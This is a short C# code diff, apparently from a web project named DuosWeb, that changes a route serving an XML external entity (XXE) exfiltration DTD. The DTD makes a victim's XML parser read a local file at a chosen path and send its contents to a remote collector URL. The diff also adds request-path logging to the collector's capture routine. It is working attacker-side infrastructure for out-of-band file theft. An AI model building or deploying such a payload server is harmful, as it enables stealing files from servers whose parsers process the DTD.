@@ -59,7 +59,7 @@ namespace DuosWeb
                     Date = DateTime.Now,
                     Info = "RESOURCE ACCESSED WITH PATH = " + path + "<br>" + getRaw()
                 });
-                return Response.AsText("<!ENTITY % data SYSTEM \"" + path + "\"><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://duos.apphb.com/tomtom/add?q=%data;'>\">");
+                return Response.AsText("<!ENTITY % data SYSTEM \"" + path + "\"><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://duos.apphb.com/tomtom/add/%data;'>\">");
             };
         }
 
@@ -68,9 +68,9 @@ namespace DuosWeb
             var dict = ((DynamicDictionary)Request.Query);
             string q = string.Join("&", dict.ToDictionary().Select(x => x.Key + "=" + x.Value));
 
-
             string raw = Request.Method + " " + Request.Path + (string.IsNullOrEmpty(q) ? string.Empty : "?" + q) + " " + Request.ProtocolVersion + "<br>";
             raw += Request.UserHostAddress + "<br>";
+            raw += "Path: " + Request.Path + "<br>";
             foreach (var r in Request.Headers)
             {
                 foreach (var v in r.Value)
